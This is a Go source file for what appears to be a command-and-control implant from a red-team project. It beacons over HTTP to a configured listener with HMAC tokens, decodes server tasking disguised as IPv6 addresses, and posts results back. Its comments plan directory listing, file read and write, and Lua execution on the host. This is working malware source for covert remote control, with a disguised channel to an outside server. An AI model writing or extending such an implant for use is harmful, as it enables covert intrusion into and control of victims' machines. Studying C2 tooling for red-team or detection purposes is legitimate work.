package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/url"

	"github.com/matt-culbert/proto-daemon/Implant/shared"
)

// ResponseData Struct to hold the response format from the server
// The key is the HMAC used to verify the data retrieved using a shared secret
type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

// CompUUID The 4 byte ID for the implant to use set at compile time
var CompUUID string

// PostURI The POST URI to use, varies on if compression is enabled or not
var PostURI string

// GetURI The GET URI to use, varies on if auth is enabled or not
var GetURI string

func main() {
	// Load configuration from embedded data
	conf, err := shared.LoadConfig()
	if err != nil {
		log.Fatalf("Failed to load config: %v", err)
	}

	maxRetries := 3

	for {
		baseUrl := ""
		baseUrl = "http://" + conf.Listener + GetURI + CompUUID
		postUrl := ""
		postUrl = "http://" + conf.Listener + PostURI + CompUUID

		token, timestamp := shared.GenerateAuthToken(CompUUID, conf.Psk2)

		//reqURL, _ := url.Parse(baseUrl)

		// Prepare the hmac params (timestamp and token)
		params := url.Values{}
		hardVals := fmt.Sprintf("timestamp=%s&token=%s", timestamp, token)

		// compedData is hardVals compressed using zlib
		// if enabled at compile time, DoComp returns the compressed object and bool true
		// if disabled (default) the function returns false
		// if false, the params are instead appended to the request uncompressed
		compedData, boolRes := shared.DoComp(hardVals)
		if boolRes {
			encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
			params.Add("da", encodedData)
		} else {
			params.Add("token", token)
			params.Add("timestamp", timestamp)
			//reqURL.RawQuery = params.Encode()
			//fmt.Println(reqURL.String())
		}

		// makeGetRequest 3 times with a 10 second delay between each attempt
		// if the request is successful, break the loop
		// otherwise, the 3 timeouts cause the program to exit
		resp, err := shared.GetDataRequest(baseUrl, maxRetries, params)
		if err != nil {
			fmt.Println("Final error:", err)
			return
		}

		// Defer closing the response body until the for loop breaks
		defer func(Body io.ReadCloser) {
			err := Body.Close()
			if err != nil {
				return
			}
		}(resp.Body)

		// Check the response status
		if resp.StatusCode != http.StatusOK {
			// non-OK http status
			break
		}

		// Read the response body
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			// reading response body failed
			break
		}

		// Parse the JSON response
		var data ResponseData
		err = json.Unmarshal(body, &data)
		if err != nil {
			// parsing json failed
			break
		}

		// Print the values (for testing)
		// fmt.Println("Message:", data.Message)
		// fmt.Println("Key:", data.Key)

		// The response comes encoded in a hex format that mimics IPv6 IPs
		// Decode that data
		decoded, err := shared.DecodeIPv6ToString(data.Message)
		if err != nil {
			fmt.Println(err)
			break
		}
		fmt.Println("Decoded string:", decoded)

		// Verify the message with the received HMAC
		if shared.VerifyMessageWithHMAC(data.Message, data.Key, []byte(conf.Psk1)) {
			fmt.Println("HMAC is valid!")
			// Here is where command processing should occur
			// A switch statement to run through possible command options, including using the lua engine
			// List arbitrary dir, read file, write file, execute Lua
			// Returns the result of execution (stdout or bool) or returns an error
			request, err := shared.SendDataRequest(postUrl, "test success")
			if err != nil {
				return
			}
			fmt.Println(request)
			break
		} else {
			fmt.Println("HMAC is invalid or message was tampered with.")
			break
		}
	}
}
